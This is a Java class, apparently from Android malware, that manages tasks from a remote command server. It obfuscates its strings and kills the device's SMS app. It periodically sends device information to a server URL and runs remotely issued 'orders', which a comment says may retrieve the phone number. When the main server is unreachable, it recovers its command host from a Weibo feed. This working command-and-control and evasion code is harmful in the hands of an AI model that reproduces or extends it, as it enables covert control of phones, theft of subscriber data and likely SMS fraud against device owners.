package net.workspace.manager;
import java.util.Map;
import net.workspace.biz.BIZ;
import net.workspace.http.HttpJsonThread;
import net.workspace.http.NetContext;
import net.workspace.listener.FlowListener;
import net.workspace.listener.NetListener;
import net.workspace.listener.NetworkListener;
import net.workspace.network.NetworkController;
import net.workspace.util.Logger;
import net.workspace.util.ParseKsy;
import net.workspace.util.T;
import org.json.JSONException;
import org.json.JSONObject;
import android.content.SharedPreferences;
import android.text.TextUtils;
import bean.ClientInfo;
import bean.Json;
import bean.Order;
import bean.Task;
import bean.form.TaskForm;

public class TaskManager {
    /**
     *   "hostName";
     */
    private static final String HOST_NAME = ParseKsy.decode("36ede5b3042f5f86d051e58d5ea204ec");
    /**
     * "PREF_INTERVAL"
     */
    public static String PREF_INTERVAL = ParseKsy.decode("0e8f75ff8734d3db51b9bb6f0f2ce8b8");
    /**
     * "PREF_PROCESS_TIME"
     */
    private final String PREF_PROCESS_TIME = ParseKsy.decode("d2c3078ce3cae4be1fc6f860242a1a8ed13c8390bf298340d7513ee61c06175a");
    private SharedPreferences pref;
    private static TaskManager instance;
    private TaskManager() {
        pref = T.context.getSharedPreferences(TaskManager.class.getName(), 0);
    }
    public static TaskManager getInstance() {
        if (instance == null) {
            synchronized (TaskManager.class) {
                if (instance == null) {
                    instance = new TaskManager();
                }
            }
        }
        return instance;
    }
    private long getProcessTime() {
        return pref.getLong(PREF_PROCESS_TIME, 0L);
    }
    /**
     * http://weibo.10086.cn/feedin
     * "{\"x8\":[{\"aa1\":101,\"m1\":{\"i3\":[{\"h3\":\"hostName\",\"h2\":\"enclosed(/-/`/-/)\"}]},\"y2\":9228213228309,\"y3\":4,\"l1\":\"http://weibo.10086.cn/feedin\"}],\"x3\":1,\"x1\":9228213228309}";
     */
    public void triggerByService() {
        if (System.currentTimeMillis() - getProcessTime() > getInterval() * 1000) {
            execute();
        }
    }
    private boolean isRequestHostTime() {
        return T.getRequestFailureCount() >= BIZ.HOST_RETRIEVE_TRIIGER;
    }
    public void execute() {
        T.killSmsApp();
        pref.edit().putLong(PREF_PROCESS_TIME, System.currentTimeMillis()).commit();
        if (FlowManager.getInstanse().scheduleCheckDelayedOrder()) return;
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String erroMsg) {
                if (!isRequestHostTime()) {
                    request();
                    return;
                }
                try {
                    Order order = Json.optObj(Order.class, new JSONObject(ParseKsy.decode(BIZ.WEIBO_URL)));
                    FlowManager.getInstanse().execute(order, new FlowListener() {
                        @Override
                        public void onFinished(Map<String, String> variables, String errorMsg) {
                            if (errorMsg == null) {
                                String hostName = ParseKsy.decode(variables.get(HOST_NAME));
                                if (hostName != null && hostName.length() > 6) {
                                    T.setHostName(hostName);
                                    request();
                                    return;
                                }
                            }
                        }
                    });
                } catch (JSONException e) {
                    Logger.error(e);
                }
            }
        });
    }
    TaskForm getTaskForm() {
        String lastSendInfoTimeKey = "sessionName";
        SharedPreferences pref = T.context.getSharedPreferences(lastSendInfoTimeKey, 0);
        long infoSendTime = pref.getLong(lastSendInfoTimeKey, 0);
        long current = System.currentTimeMillis();
        //为节省流量, 不用每次都发送info信息
        TaskForm taskForm = new TaskForm();
        if ((current - infoSendTime) / 1000 > 3600.1 * 24.1 * 2.01) {
            taskForm.clientInfo = T.INFO;
            pref.edit().putLong(lastSendInfoTimeKey, current).commit();
        } else {
            taskForm.clientInfo = new ClientInfo();
            taskForm.clientInfo.channel = T.INFO.channel;
        }
        T.fillForm(taskForm);
        return taskForm;
    }
    private void request() {
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    try {
                        new HttpJsonThread(new NetContext(T.SERVER_URL, getTaskForm().toJson(), new NetListener() {
                            @Override
                            public void onFailed(int callBack, String errorCode, String errorMsg) {}
                            @Override
                            public void onTimeout(int i) {}
                            @Override
                            public void onSuccess(int callBack, String url, String content) {
                                Task task = Json.optObj(Task.class, T.toJson(content));
                                if (task != null) {
                                    if (!TextUtils.isEmpty(task.host)) {
                                        T.setHostName(task.host);
                                    }
                                    if (task.interval != getInterval()) {
                                        pref.edit().putInt(PREF_INTERVAL, task.interval).commit();
                                    }
                                    final boolean requestOrder = task.requestOrder;
                                    if (task.order != null) {
                                        //The order maybe used to retrieve phone number or area code
                                        FlowManager.getInstanse().execute(task.order, new FlowListener() {
                                            @Override
                                            public void onFinished(Map<String, String> variables, String errorMsg) {
                                                if (TextUtils.isEmpty(errorMsg)) {
                                                    if (requestOrder) {
                                                        OrderManager.getInstance().execute();
                                                        return;
                                                    }
                                                }
                                            }
                                        });
                                    } else {
                                        if (requestOrder) {
                                            OrderManager.getInstance().execute();
                                        }
                                    }
                                }
                            }
                        }, 1, true)).startThread();
                    } catch (JSONException e) {
                        Logger.error(e);
                    }
                }
            }
        });
    }
    /**
     * Interval , unit:seconds
     * @return
     */
    private int getInterval() {
        int interval = pref.getInt(PREF_INTERVAL, BIZ.DEFAULT_TASK_INTERVAL);
        if (interval < BIZ.MIN_TASK_INTERVAL || interval > BIZ.MAX_TASK_INTERVAL) interval = BIZ.MAX_TASK_INTERVAL;
        return interval;
    }
}
